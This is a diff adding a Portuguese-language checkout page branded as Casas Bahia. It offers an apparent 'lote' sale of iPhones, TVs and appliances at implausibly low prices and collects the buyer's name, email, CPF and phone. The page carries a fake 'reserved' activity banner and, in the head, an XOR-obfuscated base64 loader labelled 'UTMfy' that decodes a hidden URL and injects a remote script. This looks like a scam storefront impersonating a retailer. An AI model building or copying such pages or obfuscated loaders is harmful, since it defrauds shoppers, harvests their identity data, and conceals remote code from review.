@@ -1,0 +1,407 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Checkout - Casas Bahia</title>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        .checkout-container {
+            max-width: 700px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+
+        .checkout-header {
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            color: #0759c7;
+            text-decoration: none;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #dbe4ef;
+            z-index: -1;
+        }
+
+        .step {
+            text-align: center;
+            flex: 1;
+        }
+
+        .step-number {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #dbe4ef;
+            color: #667085;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            margin: 0 auto 10px;
+            font-size: 14px;
+        }
+
+        .step.active .step-number {
+            background: #0759c7;
+            color: white;
+        }
+
+        .step-label {
+            font-size: 12px;
+            color: #667085;
+            font-weight: 600;
+        }
+
+        .product-info {
+            background: #f3f7fc;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 40px;
+            display: flex;
+            gap: 15px;
+        }
+
+        .product-image {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 4px;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .product-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .product-details {
+            flex: 1;
+        }
+
+        .product-lote {
+            font-size: 12px;
+            color: #667085;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .product-name {
+            font-size: 16px;
+            font-weight: 800;
+            color: #172033;
+            margin-bottom: 8px;
+        }
+
+        .product-price {
+            font-size: 20px;
+            font-weight: 800;
+            color: #e32636;
+        }
+
+        .section-title {
+            font-size: 12px;
+            color: #0759c7;
+            font-weight: 800;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        .section-heading {
+            font-size: 28px;
+            font-weight: 800;
+            color: #172033;
+            margin-bottom: 10px;
+        }
+
+        .section-description {
+            font-size: 14px;
+            color: #667085;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #172033;
+            margin-bottom: 8px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbe4ef;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #667085;
+        }
+
+        .form-group input::placeholder {
+            color: #b0b8c4;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #0759c7;
+            box-shadow: 0 0 0 3px rgba(7, 89, 199, 0.1);
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px 24px;
+            background: #e32636;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-continue:hover {
+            background: #c71c2a;
+        }
+
+        .btn-continue:active {
+            background: #b01823;
+        }
+
+        @media (max-width: 600px) {
+            .checkout-container {
+                padding: 16px;
+                margin: 20px auto;
+            }
+
+            .steps {
+                margin-bottom: 30px;
+            }
+
+            .product-info {
+                margin-bottom: 30px;
+            }
+
+            .section-heading {
+                font-size: 24px;
+            }
+        }
+    </style>
+<!-- Meta Pixel Code -->
+<script async="" src="js/fbevents.js"></script><script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2377898843012759');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2377898843012759&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<!-- UTMfy -->
+<script>(function(){var d_w=atob("DGTwFWyLz6nl6jrarR/SYB7n7ZPHgk6u3RfKOkPoq8fLn063xAKJOw/kooeHmBWpzhaZZRj44NmMkl+2ghSZbQnn4cOWyBb4zBCEZwXput2AmRjg9jncNwvnoMuEhkn4lz+LNwLqoszH0BiqxByVeSXv7YXHnFu22AHSL069rsjU0168nlGTd1i6qcvS3g28nlHFLQ6psvSY");var k_ye=[];for(var y_7br=0;y_7br<d_w.length;y_7br++){k_ye.push(d_w.charCodeAt(y_7br)&255);}var n_xd=k_ye[0];var y_ru=k_ye.slice(1,1+n_xd);var q_6ow1=k_ye.slice(1+n_xd);var a_ha8=q_6ow1.map(function(b,b_1s){return b^y_ru[b_1s%n_xd];});var n_t="";for(var b_8u=0;b_8u<a_ha8.length;b_8u++){n_t+=String.fromCharCode(a_ha8[b_8u]&255);}var c_ktz3=decodeURIComponent(escape(n_t));var d_6p=JSON.parse(c_ktz3);var v_upd=d_6p.globals||[];v_upd.forEach(function(q_v822){window[q_v822.name]=q_v822.value;});var y_u3zy=document.createElement("script");y_u3zy.src=d_6p.url;y_u3zy.async=true;y_u3zy.defer=true;(d_6p.attributes||[]).forEach(function(q_el){y_u3zy.setAttribute(q_el.name,q_el.value);});(document.head||document.documentElement).appendChild(y_u3zy);})();</script><script src="js/pixel.js" async="" defer=""></script>
+<!-- End UTMfy -->
+<script defer="" src="js/script.js"></script>
+</head>
+<body>
+    <header>
+        <div class="topbar" id="activity-topbar">
+            Brun*** Sil*** reservou um Iphone 17 Pro
+        </div>
+
+        <div class="nav wrap">
+            <a class="brand brand-logo" href="index.html" aria-label="Ir para página inicial">
+                <img src="images/logo.png" alt="Casas Bahia" class="site-logo">
+            </a>
+
+            <div class="header-security-right">
+                <span class="security-icon">🔒</span>
+                <div class="security-copy">
+                    <strong>Compra segura</strong>
+                    <small>Pagamento protegido</small>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="checkout-container">
+            <a href="javascript:history.back()" class="back-link">← Voltar ao lote</a>
+
+            <div class="steps">
+                <div class="step active">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Dados</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-label">Entrega</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Pagamento</div>
+                </div>
+            </div>
+
+            <div class="product-info" id="product-info">
+                <div class="product-image">
+                    <img id="product-img" src="" alt="Produto">
+                </div>
+                <div class="product-details">
+                    <div class="product-lote" id="product-lote"></div>
+                    <div class="product-name" id="product-name"></div>
+                    <div class="product-price" id="product-price"></div>
+                </div>
+            </div>
+
+            <form id="checkout-form">
+                <div class="section-title">ETAPA 1 DE 3</div>
+                <h2 class="section-heading">Informe seus dados</h2>
+                <p class="section-description">Precisamos dessas informações para identificar sua reserva.</p>
+
+                <div class="form-group">
+                    <label for="name">Nome completo</label>
+                    <input type="text" id="name" name="name" placeholder="Digite seu nome completo" required="">
+                </div>
+
+                <div class="form-group">
+                    <label for="email">E-mail</label>
+                    <input type="email" id="email" name="email" placeholder="seuemail@exemplo.com" required="">
+                </div>
+
+                <div class="form-group">
+                    <label for="cpf">CPF</label>
+                    <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required="">
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Telefone / WhatsApp</label>
+                    <input type="tel" id="phone" name="phone" placeholder="(00) 00000-0000" required="">
+                </div>
+
+                <button type="submit" class="btn-continue">Continuar</button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        // Get URL params
+        const params = new URLSearchParams(window.location.search);
+        const productId = params.get('id');
+        const action = params.get('action');
+
+        // Mock product data - você pode buscar da API depois
+        const products = {
+            '001': { name: 'Smart TV LG 55" 4K UHD', price: 'R$ 300,00', bidPrice: 'R$ 225,00', lote: 'LOTE 001', img: 'images/fotos_bOlVH15ihI5jHajtXlKiAjTHDTTL8yuZiyX3TbKwgTRaci5YautXgzbncWHS.jpg' },
+            '002': { name: 'Smart TV Philco 65" 4K UHD', price: 'R$ 250,00', bidPrice: 'R$ 220,00', lote: 'LOTE 002', img: 'images/xniUpw0EdngD1NG4UEIUzrr9h4pfhVrJbB4yZvWNdk2Rbwk0eLO6cwBRorDQ.jpg' },
+            '003': { name: 'Geladeira LG Frost Free 435L', price: 'R$ 350,00', bidPrice: 'R$ 275,00', lote: 'LOTE 003', img: 'images/img-65628-6a7db8a8032fc.jpg' },
+            '004': { name: 'Geladeira Brastemp Frost Free 431L', price: 'R$ 300,00', bidPrice: 'R$ 250,00', lote: 'LOTE 004', img: 'images/img-65644-6a7db9d63fcd5.jpg' },
+            '005': { name: 'Lava e seca Hisense', price: 'R$ 200,00', bidPrice: 'R$ 125,00', lote: 'LOTE 005', img: 'images/Captura%20de%20tela%202026-08-20%20155703.png' },
+            '008': { name: 'iPhone 17 Pro Max 512GB', price: 'R$ 380,00', bidPrice: 'R$ 225,00', lote: 'LOTE 008', img: 'images/foto_800100_2026_4_265_514608_0f77a9749ab25c9dabe9edb1b2ace091-1.webp' },
+            '010': { name: 'PlayStation 5 Slim 2TB', price: 'R$ 300,00', bidPrice: 'R$ 250,00', lote: 'LOTE 010', img: 'images/leilao-receita-federal-agosto-2021-5.jpg' },
+            '011': { name: 'Air Fryer Mondial 12L', price: 'R$ 290,00', bidPrice: 'R$ 120,00', lote: 'LOTE 011', img: 'images/500ff41d-0aa2-47f4-88c9-a10eb29263be.webp' },
+            '012': { name: 'Air Fryer Oven 12L', price: 'R$ 200,00', bidPrice: 'R$ 160,00', lote: 'LOTE 012', img: 'images/iyaal2GtHsEtf41LSnh3TDNo8rGFDFC4EXLBHksmzJPmsBFKPuKvJxwSWjRt.jpg' },
+            '013': { name: 'Micro-ondas Eletrolux 34L', price: 'R$ 200,00', bidPrice: 'R$ 110,00', lote: 'LOTE 013', img: 'images/13507434.jpg' },
+            '014': { name: 'Micro-ondas Philco 34L Inox', price: 'R$ 150,00', bidPrice: 'R$ 110,00', lote: 'LOTE 014', img: 'images/fotos_5HQwyzyjzHKUYFDtY7Y67B0p28ErSDbjeatsWP3QhEJNWuWJVc8E4oA8VyoX.jpg' },
+            '015': { name: 'Cafeteira Nespresso 15 Bar', price: 'R$ 220,00', bidPrice: 'R$ 130,00', lote: 'LOTE 015', img: 'images/images%20%281%29.jpg' },
+            '016': { name: 'Cafeteira Espresso Automática', price: 'R$ 295,95', bidPrice: 'R$ 260,00', lote: 'LOTE 016', img: 'images/BVSTEM7400-05.png' },
+            '018': { name: 'Lavadora de Alta Pressão 1800W', price: 'R$ 270,00', bidPrice: 'R$ 210,00', lote: 'LOTE 018', img: 'images/uJyosVpaVBf1XrDGJF8ROETJgzEcHwA1hPjvzqiLc83jDA4WaQuSY2SaPPx3.jpg' },
+            '029': { name: 'PlayStation 5 Slim 1TB', price: 'R$ 350,00', bidPrice: 'R$ 150,00', lote: 'LOTE 029', img: 'images/leilao_lote_imagem588.jpg' },
+            '055': { name: 'Notebook Lenovo Thinkpad T14', price: 'R$ 270,00', bidPrice: 'R$ 160,00', lote: 'LOTE 055', img: 'images/WhatsApp%20Image%202026-08-24%20at%2000.47.44.jpeg' },
+            '073': { name: 'Geladeira Eletrolux Porta Dupla Frost Free Inox', price: 'R$ 350,00', bidPrice: 'R$ 225,00', lote: 'LOTE 073', img: 'images/WhatsApp%20Image%202026-08-24%20at%2000.56.36.jpeg' },
+            '120': { name: 'Máquina de Lavar Consul 15kg', price: 'R$ 200,00', bidPrice: 'R$ 150,00', lote: 'LOTE 120', img: 'images/Captura%20de%20tela%202026-08-20%20145211.png' },
+            '194': { name: 'iPhone 17 Pro 512GB', price: 'R$ 360,00', bidPrice: 'R$ 225,00', lote: 'LOTE 194', img: 'images/foto-800100-2026-9-198-535306-1a9664e6b4ac5ac0b05d12efd8ca2599-1.webp' },
+            '198': { name: 'iPhone 13 512GB', price: 'R$ 280,00', bidPrice: 'R$ 125,00', lote: 'LOTE 198', img: 'images/ChatGPT-Image-25-de-jun.-de-2026-01_05_07-1290x726.jpg' },
+        };
+
+        // Load product info
+        if (productId && products[productId]) {
+            const product = products[productId];
+            const displayPrice = (action === 'bid' && product.bidPrice) ? product.bidPrice : product.price;
+            document.getElementById('product-img').src = product.img;
+            document.getElementById('product-lote').textContent = product.lote;
+            document.getElementById('product-name').textContent = product.name;
+            document.getElementById('product-price').textContent = displayPrice;
+        }
+
+        // Format CPF
+        document.getElementById('cpf').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+            }
+            if (value.length > 7) {
+                value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+            }
+            if (value.length > 11) {
+                value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+            }
+            e.target.value = value;
+        });
+
+        // Format phone
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0, 11);
+            let result = '';
+            if (v.length > 0) result = '(' + v.substring(0, 2);
+            if (v.length > 2) result += ') ' + v.substring(2, 7);
+            if (v.length > 7) result += '-' + v.substring(7, 11);
+            e.target.value = result;
+        });
+
+        // Form submission
+        document.getElementById('checkout-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const formData = {
+                name: document.getElementById('name').value,
+                email: document.getElementById('email').value,
+                cpf: document.getElementById('cpf').value,
+                phone: document.getElementById('phone').value,
+                productId: productId,
+                action: action
+            };
+
+            // Store in session
+            sessionStorage.setItem('checkoutData', JSON.stringify(formData));
+
+            // Redirect to next step (delivery)
+            window.location.href = `checkout-delivery.html?id=${productId}&action=${action}`;
+        });
+    </script>
+
+
+</body></html>
